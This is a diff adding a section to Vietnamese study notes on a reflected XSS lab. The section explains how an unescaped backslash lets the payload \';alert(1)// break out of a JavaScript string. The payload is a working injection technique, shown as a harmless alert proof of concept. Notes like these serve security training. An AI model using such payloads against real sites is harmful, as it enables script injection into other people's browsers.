@@ -632,6 +632,31 @@ Inspect:
 </script>
 ```
 
+### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+- **HTML encoded**: 
+    - `<` và `>` thành `&lt;` và `&gt;`
+    - `"` thành `&quot;`
+- **Encapsed**: Tức thêm `\` đăng trức kí tự 
+    - `'` thành `\'`
+
+Mặc dù vậy, ký tự `\` chưa được xử lý
+```html
+<script>
+    var searchTerms = '\';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+- Sử dụng nó để biến `'` thành ký tự đặc biệt, không phải chuỗi
+
+- Payload: `\';alert(1)//`
+```html
+<script>
+    var searchTerms = '\\';alert(1)//';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+- `\'` biến `'` thành kí tự đóng
+- Sau đó ngắn cách lệnh bằng `;` và `alert()` rồi `comment` lệnh đằng sau
 
 ---
 Goodluck! 🍀🍀🍀
